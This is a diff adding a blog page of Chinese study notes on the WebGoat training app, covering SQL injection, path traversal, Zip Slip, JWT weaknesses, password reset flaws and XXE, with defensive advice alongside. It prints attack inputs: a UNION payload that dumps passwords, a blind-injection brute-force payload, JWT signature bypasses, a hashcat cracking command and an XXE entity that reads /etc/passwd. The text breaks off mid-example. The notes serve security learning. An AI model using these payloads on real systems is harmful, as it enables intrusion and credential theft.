@@ -1,0 +1,1827 @@
+<!--
+	作者：Sariay
+	时间：2018-08-26
+	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
+-->
+<!DOCTYPE html>
+<html class="html-loading">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      Web靶场-WebGoat | Archeri&#39;s Blog
+    
+  </title>
+  <meta name="author" content="Archeri Shade">
+  <meta name="keywords" content="" />
+  <meta name="description" content="" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  
+<link rel="stylesheet" href="/css/Annie.css">
+
+  
+  <!-- jquery -->
+	
+<script src="/plugin/jquery/jquery.min.js"></script>
+
+
+<script>
+    const CONFIG_BGIMAGE = {
+      mode: 'random_you',
+      normalSrc: '/img/header-bg.jpg',
+      randomYouMax: 7,
+      randomYouSrc: '/img/Random-img/',
+	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
+	  preloaderEnable: true
+    }
+	
+    const CONFIG_LEACLOUD_COUNT = {
+      enable: false,
+	  appId: 'AU8...',
+	  appKey: '4cU...',
+	  serverURLs: 'http' || ' '
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="spinner">
+					<div class="double-bounce1"></div>
+					<div class="double-bounce2"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground bg-pan-br">
+	<div class="mask">
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<div class="motto text-shadow-pop-left">
+					<p class="content" id="motto-content">获取中...</p>
+					<p>-<p>
+					<p class="author" id="motto-author">Just a minute...</p>
+				</div>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more" class="scroll-down">
+				<span class="icon-anchor1 animation-scroll-down"></span>
+			</a>
+		</div>
+	</div>
+</header>
+
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
+
+	<!-- Progress percent -->
+	<div id="progress-percentage"><span>0.0%</span></div>
+
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
+
+	<!-- Page title -->
+	<p>
+		
+			「Web靶场-WebGoat」
+		
+	</p>
+
+	
+	
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<span class="logo"> 
+			<img src="/img/logo.png">
+		</span>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	
+	<div class="nav-body">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+	
+	<div class="nav-footer">
+		<ul id="global-social">
+	
+		<li>
+			<a href="https://github.com/ArcheriShade" target="_blank">
+				<span class="icon-github"></span>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+<script src="/plugin/toc/katelog.min.js"></script>
+
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+		<div class="article-title">
+			
+	<a href="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/" itemprop="url">
+		Web靶场-WebGoat
+	</a>
+
+		</div>
+
+		<div class="article-meta">
+			<span>
+				<i class="icon-calendar1"></i>
+				
+				
+
+
+
+
+	更新于
+
+	<a href="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/" itemprop="url">
+		<time datetime="2021-10-10T07:33:33.000Z" itemprop="dateUpdated">
+	  		2021-10-10
+	  </time>
+	</a> 
+
+
+
+			</span>
+			<span>
+				
+	<i class="icon-price-tags"></i>
+	
+		<a href="/tags/Web/" class=" ">
+			Web
+		</a>
+	
+		<a href="/tags/Web%E9%9D%B6%E5%9C%BA/" class=" ">
+			Web靶场
+		</a>
+	
+		<a href="/tags/WebGoat/" class=" ">
+			WebGoat
+		</a>
+	
+		
+			</span>
+			
+			
+
+
+
+		</div>
+
+		<div class="article-content" id="article-content">
+			<h1 id="NOTE-WebGoat"><a href="#NOTE-WebGoat" class="headerlink" title="[NOTE] WebGoat"></a>[NOTE] WebGoat</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>是对WebGoat靶场的学习笔记<br>不会每个小内容都记下来<br>只会写写我感兴趣、不太理解或者是觉得重要的部分</p>
+<p><del>这逼靶场看了N边了草</del></p>
+<h2 id="CIA"><a href="#CIA" class="headerlink" title="CIA"></a>CIA</h2><ul>
+<li>Confidentiality（机密性）</li>
+<li>Integrity（完整性）</li>
+<li>Availability（可用性）</li>
+</ul>
+<h2 id="常见编码形式"><a href="#常见编码形式" class="headerlink" title="常见编码形式"></a>常见编码形式</h2><ul>
+<li><p>BASE64编码<br>略</p>
+</li>
+<li><p>URL编码<br>就是GET传参时出现在URL里的诸如“%20”之类的符号</p>
+</li>
+<li><p>HTML编码<br>就是防止“&lt;、&gt;”之类的被解析成HTML元素，即HTML实体编码，诸如“&amp;lt;、&amp;gt;”</p>
+</li>
+<li><p>UU编码<br>有这么点类似于BASE64编码，常用于邮件附件转码</p>
+</li>
+<li><p>XOR编码&#x2F;<strong>加密</strong><br>异或编码，需要就是原文和<strong>密钥</strong>做异或，输出密文（对合操作）<br>常用于数据库加密存储密码等敏感字段</p>
+</li>
+<li><p>{xor}BASE64字符串</p>
+<blockquote>
+<p>{xor}Oz4rPj0+LDovPiwsKDAtOw&#x3D;&#x3D;</p>
+</blockquote>
+<p>一段由异或编码处理过的信息，而且是用IBM的WebSphere工具中的编码规则处理的<br>从网上找到专门解码WebSphere规则的应用进行解码：<a target="_blank" rel="noopener" href="http://www.sysman.nl/wasdecoder/">http://www.sysman.nl/wasdecoder/</a></p>
+</li>
+</ul>
+<h2 id="OpenSSL使用"><a href="#OpenSSL使用" class="headerlink" title="OpenSSL使用"></a>OpenSSL使用</h2><ol>
+<li><p>自己生成公私钥对</p>
+</li>
+<li><p>根据私钥生成公钥</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -in rsa_private_key.pem -out rsa_public_key.pem -pubout</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>从私钥提取模数（modulus）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -modulus -in rsa_private_key.pem -out modulus -noout</span><br></pre></td></tr></table></figure>
+
+<p>或</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -in ./privatekey.pem -modulus</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用私钥签名（下面是对模数签名）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl dgst -sign rsa_private_key.pem -sha256 -out modulus.signature modulus</span><br></pre></td></tr></table></figure>
+
+<p>或</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -n &#123;模数&#125; | openssl dgst -sign ./privatekey.pem -sha256 -out ./dgst.txt</span><br><span class="line">base64 ./dgst.txt &gt; result</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>BASE64编码转换</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 ./dgst.txt &gt; result</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>对某一加密字符串进行指定解密</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#123;BASE64 String&#125; | openssl enc -aes-256-cbc -d -a -kfile ~/TEMP/keyfile</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="docker安全"><a href="#docker安全" class="headerlink" title="docker安全"></a>docker安全</h2><p>不要把用户密码文件（例如系统用户密码）放到docker镜像中<br>因为可以使用docker的cp命令无视权限将密码文件（如shadow、passwd）放到容器外面<br>然后可以外部修改root的密码，再cp回去覆盖，即可做到任意重置容器用户密码</p>
+<h2 id="SQL安全"><a href="#SQL安全" class="headerlink" title="SQL安全"></a>SQL安全</h2><ul>
+<li>DML (Data Manipulation Language)<br>SELECT、UPDATE、DELETE<br>大概是数据操作语言</li>
+<li>DDL (Data Definition Language)<br>CREATE、ALTER、DROP<br>大概是数据定义语言</li>
+<li>DCL (Data Control Language)<br>GRANT、REVOKE<br>大概是权限控制语言</li>
+</ul>
+<h3 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h3><p>就是SQL injection</p>
+<hr>
+<p>关于NOT、OR、AND的计算优先级顺序：<br><strong>NOT&gt;AND&gt;OR</strong></p>
+<p>所以有如下例子：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">From</span> user_data <span class="keyword">WHERE</span> Login_Count <span class="operator">=</span> <span class="number">1</span> <span class="keyword">OR</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> userid<span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>先计算“1 &#x3D; 1 AND userid&#x3D; 1”，得false</li>
+<li>再计算“Login_Count &#x3D; 1 OR false”，得false</li>
+<li>所以总体为false，注入失败</li>
+</ol>
+<p>再有如下例子：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">From</span> user_data <span class="keyword">WHERE</span> Login_Count <span class="operator">=</span> <span class="number">1</span> <span class="keyword">AND</span> userid<span class="operator">=</span> <span class="number">1</span> <span class="keyword">OR</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>先计算“Login_Count &#x3D; 1 AND userid&#x3D; 1”，得false</li>
+<li>再计算“false OR 1&#x3D;1”，得true</li>
+<li>所以总体为true，注入成功</li>
+</ol>
+<hr>
+<p>元字符“;”<br>构造查询链&#x2F;命令链去修改数据，破坏完整性（确保SQL格式语法正确）</p>
+<hr>
+<p>使用“%”的SQL搜索语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> access_log <span class="keyword">WHERE</span> action <span class="keyword">LIKE</span> <span class="string">&#x27;%&quot; + action + &quot;%&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试主动闭合：<em>XXX%’</em></p>
+<h3 id="SQL特殊字符"><a href="#SQL特殊字符" class="headerlink" title="SQL特殊字符"></a>SQL特殊字符</h3><p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211010154419799.png" alt="SQL特殊字符"></p>
+<h3 id="UNION-JOINS"><a href="#UNION-JOINS" class="headerlink" title="UNION&amp;JOINS"></a>UNION&amp;JOINS</h3><p>基本上都是用于合并查询结果，或者是用于一次查询获取多个结果<br>区别在于：</p>
+<ul>
+<li>UNION要求多个SELECT之间查询的<strong>字段数目和类型</strong>都是一样的</li>
+<li>JOINS使用两份数据之间的某种<strong>联系</strong>来合并多行</li>
+</ul>
+<p>使用union可以使用‘a’、’b’、’c’或1、2、3等来代替空缺的字段<br>从而使多个select之间字段数目和类型都相同</p>
+<p>例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> user_data <span class="keyword">WHERE</span> last_name <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> userid,user_name, password, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="number">1</span> <span class="keyword">from</span> user_system_data <span class="comment">--&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="一个盲注payload-BP爆破"><a href="#一个盲注payload-BP爆破" class="headerlink" title="一个盲注payload&amp;BP爆破"></a>一个盲注payload&amp;BP爆破</h3><p>cluster bomb模式，第一个payload设置number、第二个设置字符集，<strong>注意限速</strong>，不然容易出错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username_reg=tom&#x27;+and+substr(password,$1$,1)=&#x27;$1$&#x27; --&amp;email_reg=tom%40webgoat.org&amp;password_reg=123456&amp;confirm_password_reg=123456</span><br></pre></td></tr></table></figure>
+
+<h3 id="SQLi防御"><a href="#SQLi防御" class="headerlink" title="SQLi防御"></a>SQLi防御</h3><p>Immutable Queries（静态查询与预编译）</p>
+<h4 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h4><p>statement &amp; prepared statement</p>
+<ul>
+<li>‘?’可用于占位符</li>
+<li>Placeholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and data</li>
+<li>Prepared statements are compiled once by the database management system waiting for input and are pre-compiled this way</li>
+<li>Pre-statement会预编译，然后等待参数，速度上比SQL拼接再编译执行要快</li>
+</ul>
+<h4 id="存储过程"><a href="#存储过程" class="headerlink" title="存储过程"></a>存储过程</h4><p>存储过程也要合理使用才安全，对比如下：</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211010155442103.png" alt="image-20211010155442103"></p>
+<hr>
+<p>一个JAVA使用预编译的例子：</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211010155507878.png" alt="image-20211010155507878"></p>
+<p>或者代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">userName</span> <span class="operator">=</span> <span class="string">&quot;peter&quot;</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(DBURL, DBUSER, DBPW);</span><br><span class="line">    <span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> conn.prepareStatement(<span class="string">&quot;SELECT * FROM users WHERE name = ?&quot;</span>);</span><br><span class="line">    ps.setString(<span class="number">1</span>, userName);</span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">results</span> <span class="operator">=</span> ps.executeQuery();</span><br><span class="line">    System.out.println(results.next());</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Oops, Something went wrong!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="最小特权原则"><a href="#最小特权原则" class="headerlink" title="最小特权原则"></a>最小特权原则</h4><ul>
+<li>连接数据库的用户权限最小——应用很少需要对表或数据库的删除权限</li>
+<li>数据库用户应该限制模式访问</li>
+<li>确定数据库用户的读写权限</li>
+<li>基于访问的多个连接（池）<ul>
+<li>验证查询应“只读”</li>
+<li>数据修改查询应“读写”</li>
+<li>存储过程调用应“执行”</li>
+</ul>
+</li>
+</ul>
+<h4 id="预编译的问题"><a href="#预编译的问题" class="headerlink" title="预编译的问题"></a>预编译的问题</h4><p>即使后端做了预处理或者其他操作来防止SQL注入，前端也依旧需要输入过滤<br>防止XSS、信息泄露等其他安全威胁</p>
+<p>预编译不能完全防止SQL注入<br>原因….感觉复杂，一大段话：</p>
+<blockquote>
+<p>This means an <strong>orderExpression</strong> can be a <strong>selectExpression</strong> which can be a function as well, so for example with a case statement we might be able to ask the database some questions, like:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="literal">TRUE</span>) <span class="keyword">THEN</span> lastname <span class="keyword">ELSE</span> firstname)</span><br></pre></td></tr></table></figure>
+
+<p>So we can substitute any kind of boolean operation in the <strong>when(….)</strong> part. The statement will just work because it is a valid query whether you use a prepared statement or not. An order by clause can by definition contain an expression.</p>
+</blockquote>
+<p>进一步缓解：</p>
+<blockquote>
+<p>If you need to provide a sorting column in your web application you should implement a whitelist to validate the value of the order by statement. It should always be limited to something like ‘first name’ or ‘last name’.</p>
+</blockquote>
+<p>后面有例子：<br>可以选择某个列进行排列，发现会发送GET请求，有个column参数<br>改成payload：column&#x3D;(CASE WHEN (TRUE) THEN ip ELSE hostname END)<br>看看会不会按ip排列，从而判断有没有注入<br>然后构造<strong>WHEN()里面的表达式</strong>，形成类似于<strong>盲注</strong>的注入情况（实际上就是<strong>排序注入</strong>）</p>
+<p>日后补充：因为<code>order by</code>后续需要接字段名，预编译的话会自动加引号，所以<code>order by</code>后续很少使用预编译，不然会爆语法错误<br>总之就是，预编译与<code>order by</code>相性不好，<strong>排序注入</strong>存在可能</p>
+<h2 id="路径遍历"><a href="#路径遍历" class="headerlink" title="路径遍历"></a>路径遍历</h2><p>dot-dot-slash：..&#x2F;</p>
+<p>URL-encoding：%2e%2e%2f<br>双重URL-encoding</p>
+<p>关键还是要对文件读取的各个接口敏感点<br>观察怎么利用，注意防御对策</p>
+<hr>
+<p><strong>Zip Slip vulnerability</strong></p>
+<p>一个提取zip文件时产生的漏洞，可以利用路径穿越去覆写一些常见的命令例如“ls”<br>受害者每次执行ls，都会将结果先发送给攻击者<br>最终攻击者可以RCE</p>
+<p>比较经典的代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">destinationDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/tmp/zip&quot;</span>);</span><br><span class="line">Enumeration&lt;? <span class="keyword">extends</span> <span class="title class_">ZipEntry</span>&gt; entries = zip.entries();</span><br><span class="line"><span class="keyword">while</span> (entries.hasMoreElements()) &#123;</span><br><span class="line">  <span class="type">ZipEntry</span> <span class="variable">e</span> <span class="operator">=</span> entries.nextElement();</span><br><span class="line">  <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(destinationDir, e.getName());</span><br><span class="line">  <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> zip.getInputStream(e);</span><br><span class="line">  IOUtils.copy(is, write(f));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>destinationDir</strong>参数可以被路径穿越</p>
+<p>大概就是，开发者用zip里面的文件来上传，但是可以控制里面的文件所解压的路径？<br>建议多看几遍</p>
+<h2 id="认证失效"><a href="#认证失效" class="headerlink" title="认证失效"></a>认证失效</h2><p>绕过安全问题的一个方法：删掉安全问题参数或者将安全问题参数的序号改一改</p>
+<hr>
+<p>简单提及一下cookie、session以及token的一个观点<br>cookie侧重于<strong>客户端行为</strong>，多用于<strong>记录</strong>用户设置、行为等，多存储于客户端，又分为内存cookie（短时cookie）和硬盘cookie（长时cookie）<br>session和token侧重于<strong>服务端行为</strong>，注重<strong>身份认证</strong></p>
+<h3 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h3><p>JSON Web Tokens<br>使用HMAC算法或公私钥对进行签名</p>
+<p>基本使用流程图：</p>
+<p><img src="/2021/10/10/Web%E9%9D%B6%E5%9C%BA-WebGoat/image-20211010160425224.png" alt="image-20211010160425224"></p>
+<p>后续客户一般在请求头中的“Authorization”字段里加上JWT</p>
+<p>基本格式：<br><code>&#123;header&#125;.&#123;body&#125;.&#123;sign&#125;</code><br>每个部分都经过base64编码，且各自最后没有“&#x3D;”，最后再用“.”相连</p>
+<h3 id="BASE64-URL"><a href="#BASE64-URL" class="headerlink" title="BASE64 URL"></a>BASE64 URL</h3><p>在HTTP传输过程中，Base64编码中的”&#x3D;”,”+”,”&#x2F;“等特殊符号通过URL解码通常容易产生歧义因此产生了与URL兼容的Base64 URL编码<br>在Base64 URL编码中，**”+“会变成”-“，”&#x2F;“会变成”_”，”&#x3D;”会被去掉**，以此达到url safe的目的</p>
+<h3 id="一些风险点"><a href="#一些风险点" class="headerlink" title="一些风险点"></a>一些风险点</h3><ul>
+<li>header中的加密算法字段可以修改为“none”，同时删除签名字段后，该JWT可能会绕过一些服务器的签名检查</li>
+<li>一个“RS256”(RSA, 2048位)参数值可以被更改为“HS256”(HMAC, SHA-256)，并且一些库会尝试使用HMAC- sha256和使用RSA公钥作为HMAC共享密钥来验证签名(参见[McLean]和[CVE-2015-9235])</li>
+</ul>
+<p>基本上发生的事情是，库只解析令牌，而不验证令牌创建过程中使用的加密操作</p>
+<h3 id="JWT签名密钥爆破"><a href="#JWT签名密钥爆破" class="headerlink" title="JWT签名密钥爆破"></a>JWT签名密钥爆破</h3><p>命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 16500 jwt.txt -a 3 dict.txt</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>-m 16500：这里的<strong>16500</strong>对应的就是JWT的爆破</li>
+<li>-a 3：代表蛮力破解</li>
+<li>-w 3：可以理解为高速破解，就是会让桌面进程无响应的那种高速（可省略）</li>
+<li>jwt.txt：要求破解的JWT文件</li>
+<li>dict.txt：字典文件</li>
+</ul>
+<p>要是JWT有期限字段，可以尝试修改有效期使其生效</p>
+<p>其实有时候不一定要爆破，尝试修改加密算法为“none”，然后删掉后面签名</p>
+<h3 id="Token的使用"><a href="#Token的使用" class="headerlink" title="Token的使用"></a>Token的使用</h3><p>access token &amp; refresh token<br>两者的区别</p>
+<p>注意事项：</p>
+<ul>
+<li>注意重点保护refresh token，因为access token生成需要鉴别它</li>
+<li>注意每个access token应该只与一个refresh token对应，否则攻击者可能通过自己的refresh token生成别人的access token（越权）</li>
+<li>注意检查refresh token的使用情况（次数、频率、时间、地理位置等），不对劲则应要求用户重新认证并重新获取refresh token</li>
+</ul>
+<p>啥时候用JWT？<br>WebGoat建议是server与server之间使用，普通Web应用使用普通cookies更好</p>
+<h3 id="Tom-Jerry的题"><a href="#Tom-Jerry的题" class="headerlink" title="Tom&amp;Jerry的题"></a>Tom&amp;Jerry的题</h3><p>这题要用组合拳<br>JWT头部的kid字段存在SQL注入（这我咋知道啊）（看源码？）<br>大概是用这个字段从数据库中选择密钥要进行加密签名<br>所以可以修改为“select ‘1’ ….”，这样密钥就会变成自己设置的‘1’，从而可以控制JWT<br>（注意BASE64编码，要结合源码）</p>
+<p>启示：注入不要拘泥于明文字符，可能有编码后再注入</p>
+<img src="image-20211010162838873.png" alt="image-20211010162838873" style="zoom: 67%;" />
+
+<h3 id="JWT使用注意事项"><a href="#JWT使用注意事项" class="headerlink" title="JWT使用注意事项"></a>JWT使用注意事项</h3><ul>
+<li>锁定算法，确保用户不能修改算法</li>
+<li>当使用对称密钥签名时，请确保密钥的长度</li>
+<li>尽量不要在JWT主体中添加敏感信息，除非经过加密</li>
+<li>请确保足够的测试案例被使用，使用第三方测试服务并不意味自己无需测试；请保证非法的JWT一定是无效的</li>
+</ul>
+<h2 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h2><h3 id="账户信息输出"><a href="#账户信息输出" class="headerlink" title="账户信息输出"></a>账户信息输出</h3><p>一些比较敏感的网站，其用户是否存在也是敏感的<br>因此页面应该尽量显示少的信息，而不是直接输出“该用户&#x2F;邮箱已注册&#x2F;存在”、“用户&#x2F;邮箱不存在”<br>对于重置密码的邮箱输入，应<strong>无论邮箱是否存在都输出“邮件已发送”</strong></p>
+<h3 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h3><p>aka knowledge-based authentication (KBA)</p>
+<p>安全问题在数据库中的存储也应该是加密存储的<br>即应和密码采用同样等级甚至是更高等级的存储</p>
+<p>安全问题应该设定锁定次数，防止一些简单问题答案被爆破</p>
+<blockquote>
+<p>The “perfect” security question should be <strong>hard to crack, but easy to remember</strong>. Also the answer needs to fixed, so it must not be subject to change.</p>
+</blockquote>
+<p>接下来列举了一些常见的安全问题，并且展示了它们为什么不如想象中的好</p>
+<ul>
+<li>因为容易从别的社交媒体中找出（社工）<ul>
+<li>最喜欢的动物</li>
+<li>初吻对象（或直接猜名字）（540</li>
+<li>童年居住的街道名（或者直接就是现在居住的地方）</li>
+<li>第一份工作的地点或城市（LinkedIn、Facebook或国内求职网站等）</li>
+<li>出生城市（或直接猜）</li>
+<li>申请过但没有成功的公司&#x2F;大学（可以直接搜索所在城市公司&#x2F;大学）</li>
+<li>小时候的花名</li>
+</ul>
+</li>
+<li>因为很容易猜（爆破）<ul>
+<li>XXX的出生月份</li>
+<li>哪只手戴手表（？？戴牛子上）</li>
+<li>童年英雄</li>
+<li>最喜欢的颜色</li>
+</ul>
+</li>
+<li>很难记（可用性差）<ul>
+<li>啥时候生，精确到分秒</li>
+<li>三年级最喜欢老师的姓氏（？？？或许可以直接猜）</li>
+</ul>
+</li>
+</ul>
+<h3 id="密码重置链接"><a href="#密码重置链接" class="headerlink" title="密码重置链接"></a>密码重置链接</h3><p>应该满足以下要求：</p>
+<ul>
+<li>使用独一无二的<strong>随机token</strong>作为URL的一部分（防止DOS重置任意用户密码）</li>
+<li>应该<strong>只能使用一次</strong></li>
+<li>应当设置链接<strong>有效期</strong></li>
+</ul>
+<p>密码重置链接要当心越权的问题<br>就是要当心唯一标识的字段可以被攻击者获取<br>（例如修改host，伪造假链接，引诱受害者点击，从而获取到字段）（CSRF）<br>从而可以修改链接，达到任意重置密码的目的</p>
+<h2 id="安全密码"><a href="#安全密码" class="headerlink" title="安全密码"></a>安全密码</h2><p>两个方面：密码本身的强度、密码的存储安全</p>
+<p>如何安全存储密码</p>
+<ul>
+<li>使用安全信道或加密信道传输密码</li>
+<li>要求能抵御<strong>脱机攻击</strong></li>
+<li>哈希存储加盐</li>
+<li>使用安全哈希</li>
+<li>memory hard key derivation function</li>
+<li>high cost factor</li>
+<li>看原文去啊草</li>
+</ul>
+<h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><p>水</p>
+<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>建议自己先去了解一些XXE相关<br>（了解那么久还是不会啊草，自己复现又是各种问题啊草）</p>
+<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ul>
+<li>Classic<br>in this case an external entity is included in a local DTD<br>（外部实体包含在本地DTD中）</li>
+<li>Blind<br>no output and or errors are shown in the response<br>（无任何回显）</li>
+<li>Error<br>try to get the content of a resource in the error message<br>（在错误输出中获取资源信息）</li>
+</ul>
+<h3 id="基本例子"><a href="#基本例子" class="headerlink" title="基本例子"></a>基本例子</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">author</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">js</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 